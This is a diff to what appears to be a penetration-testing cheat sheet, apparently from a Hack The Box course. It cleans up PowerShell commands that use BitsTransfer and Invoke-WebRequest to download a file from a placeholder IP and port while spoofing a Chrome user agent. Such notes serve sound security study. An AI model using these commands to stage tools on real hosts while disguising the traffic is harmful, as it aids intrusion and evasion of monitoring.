@@ -116,7 +116,6 @@ Import-Module bitstransfer; Start-BitsTransfer -Source "<URL>" -Destination "<ou
 
 ## chrome user agent - download file
 ```
-PS C:\htb> $UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
-PS C:\htb> Invoke-WebRequest http://<IP>:<PORT>/<file> -UserAgent $UserAgent -OutFile "<outfile>"
-
-`
+$UserAgent = [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome
+Invoke-WebRequest http://<IP>:<PORT>/<file> -UserAgent $UserAgent -OutFile "<outfile>"
+```
